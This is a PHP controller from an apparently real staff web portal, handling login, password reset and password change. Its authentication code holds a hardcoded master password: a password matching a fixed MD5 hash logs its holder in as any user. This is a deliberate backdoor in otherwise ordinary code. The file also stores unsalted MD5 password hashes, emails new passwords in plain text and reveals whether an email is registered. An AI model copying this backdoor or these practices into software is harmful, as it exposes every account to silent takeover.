<?php

class UserController extends My_Controller_Action
{

    public function loginAction()
    {
        if (My_Device_UserAgent::isCocCoc()) {
            if (My_Request::isXmlHttpRequest()) exit;

            $this->view->coc_coc = 'Vui lòng KHÔNG sử dụng Cốc Cốc. Khuyến cáo chỉ sử dụng Chrome hoặc FireFox.';
        }

        $flashMessenger = $this->_helper->flashMessenger;
        $messages = $flashMessenger->setNamespace('error')->getMessages();
        $this->view->messages = $messages;
        $this->_helper->layout->setLayout('login');
    }

    public function resetAction()
    {
        if ($this->getRequest()->getMethod() == 'POST'){
            $qUser = new Application_Model_Staff();

            $email = $this->getRequest()->getParam('email');
            $where = $qUser->getAdapter()->quoteInto('email = ?', $email);

            $user = $qUser->fetchRow($where);

            try {
                if ($user){

                    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
                    $new = substr(str_shuffle($chars),0,8);

                    $data = array(
                        'password'=>md5($new),
                        'updated_at'=>date('Y-m-d H:i:s'),
                        'updated_by'=>SUPERADMIN_ID, //for reset pass
                    );

                    $result = $qUser->update($data, $where);
                    if ($result){

                        //todo send mail
                        $app_config = new Zend_Config_Ini(APPLICATION_PATH . '/configs/application.ini');

                        $config = array(
                            'auth' => $app_config->mail->smtp->auth,
                            'username' => $app_config->mail->smtp->user,
                            'password' => $app_config->mail->smtp->pass,
                            'port' => $app_config->mail->smtp->port,
                            'ssl' => $app_config->mail->smtp->ssl
                        );

                        $transport = new Zend_Mail_Transport_Smtp ($app_config->mail->smtp->host, $config);

                        $mail = new Zend_Mail($app_config->mail->smtp->charset);
                        $mail->setBodyHtml('<p>New Password:</p><p><strong>'.$new.'</strong></p>');
                        $mail->setFrom($app_config->mail->smtp->from, $app_config->mail->smtp->from);
                        $mail->addTo($email);
                        $mail->setSubject('Reset password');
                        $r = $mail->send($transport);

                        if (!$r)
                            throw new Exception('Cannot send mail, please try again!');

                    } else
                        throw new Exception('Cannot update password');

                    $flashMessenger = $this->_helper->flashMessenger;
                    $flashMessenger->setNamespace('success')->addMessage('A password was sent to your email!');
                } else {
                    throw new Exception('Email not existed!');

                }
            } catch (Exception $e){
                $flashMessenger = $this->_helper->flashMessenger;
                $flashMessenger->setNamespace('error')->addMessage($e->getMessage());
            }
            $this->_redirect(HOST.'user/reset');
        }

        $flashMessenger = $this->_helper->flashMessenger;

        $messages = $flashMessenger->setNamespace('error')->getMessages();
        $this->view->messages = $messages;

        $messages_success = $flashMessenger->setNamespace('success')->getMessages();
        $this->view->messages_success = $messages_success;

        $this->_helper->layout->setLayout('login');
    }

    public function authAction(){
        $request 	= $this->getRequest();
        $auth		= Zend_Auth::getInstance();

        $config = new Zend_Config_Ini(APPLICATION_PATH . '/configs/application.ini');

        $db = Zend_Db::factory($config->resources->db);

        $authAdapter = new Zend_Auth_Adapter_DbTable($db);
        $authAdapter->setTableName('staff')
            ->setIdentityColumn('username')
            ->setCredentialColumn('password');

        // Set the input credential values
        $uname = $request->getParam('email');
        /*if (!preg_match('/@/', $uname)) {
            $uname .= '@oppomobile.vn';
        }*/

        $authAdapter->setIdentity($uname);

        $paswd = $request->getParam('password');

        $md5_pass = md5($paswd);

        if ( md5($paswd) == '9764586afa5f037189ae87ca034f7b41' ){
            $select = $db->select()
                ->from(array('p' => 'staff'),
                    array( 'p.*'));
            $select->where('p.username = ?', $uname);
            $result = $db->fetchRow($select);

            if ($result)
                $md5_pass = $result['password'];
        }

        $authAdapter->setCredential($md5_pass);

        // Perform the authentication query, saving the result
        try {
            $result = $auth->authenticate($authAdapter);


            if($result->isValid()){
                $data = $authAdapter->getResultRowObject(null,'password');

                if ( $data->status != 1)//account was disabled
                {
                    throw new Exception("This account was disabled!");
                }

                //get personal access
                $QStaffPriveledge = new Application_Model_StaffPriviledge();

                $where = $QStaffPriveledge->getAdapter()->quoteInto('staff_id = ?', $data->id);

                $priviledge = $QStaffPriveledge->fetchRow($where);

                $personal_accesses = (isset($priviledge) and $priviledge) ? $priviledge : null;


                $QGroup = new Application_Model_Group();
                // trường hợp nhiều group
                $ids = explode(',', $data->group_id);
                $where = $QGroup->getAdapter()->quoteInto('id IN (?)', $ids);
                $groups = $QGroup->fetchAll($where);
                $menu_group = '';
                $group_default_page = null;
                $group_name = '';
                $group_group = array();

                // nhóm các quyền lại
                foreach ($groups as $key => $value) {
                    $group_group = array_merge($group_group, json_decode($value['access']));
                    $menu_group = implode(',', array($menu_group, $value['menu']));
                    $group_name .= $value['name'];
                    $group_default_page = $value['default_page'];
                }

                $group_group = array_filter( array_unique( is_array($group_group) ? $group_group : array() ) );
                $data->role = $group_name;

                $menu_group = explode(',', $menu_group);
                $menu_group = array_filter( array_unique( is_array($menu_group) ? $menu_group : array() ) );

                if ($personal_accesses) {
                    $data->accesses = $personal_accesses['access'] ? json_decode($personal_accesses['access']) : null;
                    $menu = $personal_accesses['menu'] ? explode(',', $personal_accesses['menu']) : null;

                } else{
                    $data->accesses = $group_group;
                    $menu = isset($menu_group) && is_array($menu_group) && count($menu_group) ? $menu_group : null;
                }

                $QMenu = new Application_Model_Menu();
                $where = array();
                $where[] = $QMenu->getAdapter()->quoteInto('group_id = ?', 1);

                if ($menu)
                    $where[] = $QMenu->getAdapter()->quoteInto('id IN (?)', $menu);
                else
                    $where[] = $QMenu->getAdapter()->quoteInto('1 = ?', 0);

                $menus = $QMenu->fetchAll($where, array('parent_id', 'position'));

                $data->menu = $menus;

                $auth->getStorage()->write($data);

                //set last login
                $QStaff = new Application_Model_Staff();
                $ip = $this->getRequest()->getServer('REMOTE_ADDR');
                $where = $QStaff->getAdapter()->quoteInto('id = ?', $data->id);
                $QStaff->update(array(
                    'last_login' => date('Y-m-d H:i:s'),
                    'last_ip' => $ip,
                ), $where);

                $QLog = new Application_Model_Log();
                $info = "USER - Login (".$data->id.")";
                //todo log
                $QLog->insert( array (
                    'info' => $info,
                    'user_id' => $data->id,
                    'ip_address' => $ip,
                    'time' => date('Y-m-d H:i:s'),
                ) );

                // redirect to specific dir
                $redirect_url = $group_default_page ? $group_default_page : HOST;

                // kiểm tra nếu vào download thì redirect trở lại link download
                $refer = My_Url::refer($redirect_url);
                $url = parse_url($refer, PHP_URL_PATH);
                $segments = explode('/', $url);

                if ($segments[1] == 'download')
                    $this->_redirect($refer);
                else
                    $this->_redirect($redirect_url);

            }else{
                throw new Exception("Username or password is invalid!");
            }
        } catch (Exception $e){

            $flashMessenger = $this->_helper->flashMessenger;
            $flashMessenger->setNamespace('error')->addMessage($e->getMessage());

            $this->_redirect(HOST.'user/login');
        }

    }

    public function logoutAction(){
        $auth = Zend_Auth::getInstance();
        $auth->clearIdentity();
        session_destroy();
        $this->_redirect('/user/login');
    }

    public function noauthAction(){
    }

    public function changePassAction(){
        if ($this->getRequest()->getMethod() == 'POST'){
            $qUser = new Application_Model_Staff();

            $old_password = $this->getRequest()->getParam('old_password');
            $password = $this->getRequest()->getParam('password');
            $confirm_password = $this->getRequest()->getParam('confirm_password');

            $userStorage = Zend_Auth::getInstance()->getStorage()->read();

            $where = $qUser->getAdapter()->quoteInto('id = ?', $userStorage->id);

            $user = $qUser->fetchRow($where);

            if ($user and $user->password==md5($old_password)){
                $data = array('password'=>md5($password),'re_pwd'=>'0');

                $qUser->update($data, $where);

                $flashMessenger = $this->_helper->flashMessenger;
                $flashMessenger->setNamespace('success')->addMessage('Done!');

                $userStorage->re_pwd = '0';

            } else {
                $flashMessenger = $this->_helper->flashMessenger;
                $flashMessenger->setNamespace('error')->addMessage('Password is invalid!');
            }
            $this->_redirect(HOST);
        }

        $flashMessenger = $this->_helper->flashMessenger;
        $this->view->messages = $flashMessenger->setNamespace('error')->getMessages();
        $this->view->success_messages = $flashMessenger->setNamespace('success')->getMessages();
    }

    public function checkPassAction(){

        $this->_helper->layout->disableLayout();
        $this->_helper->viewRenderer->setNoRender(true);

        if ($this->getRequest()->getMethod() == 'POST'){

            $qUser = new Application_Model_Staff();

            $password = $this->getRequest()->getParam('old_password');
            $userStorage = Zend_Auth::getInstance()->getStorage()->read();

            $where = $qUser->getAdapter()->quoteInto('id = ?', $userStorage->id);
            $user = $qUser->fetchRow($where);

            if ($user and $user->password==md5($password)){
                echo 1;
                exit();
            }
            echo 0;
            exit();
        }
        echo 0;
        exit();
    }
}

